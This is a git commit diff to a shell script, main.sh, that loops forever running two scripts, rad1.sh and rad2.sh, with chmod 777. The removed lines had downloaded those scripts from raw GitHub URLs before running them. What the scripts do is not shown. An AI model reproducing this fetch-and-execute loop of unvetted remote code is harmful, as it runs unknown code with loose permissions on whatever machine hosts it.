0171d3e49186e3f1b330aa67d27d404061d90295
Mafs68 <92165260+Mafs68@users.noreply.github.com>
2021-10-14 12:00:21 +0530

    Update main.sh

--- main.sh
+++ main.sh
@@ -2,12 +2,13 @@
 
 while :
 do
-	wget https://github.com/Nuecb56/hjs839/raw/main/rad1.sh
+
+        chmod 777 rad2.sh
+	timeout 10m ./rad2.sh
+	sleep 5
 	chmod 777 rad1.sh
 	./rad1.sh
 	sleep 5
-	https://github.com/Nuecb56/hjs839/raw/main/rad2.sh
-	chmod 777 rad2.sh
-	timeout 10m ./rad2.sh
-	sleep 5
+	
+	
 done
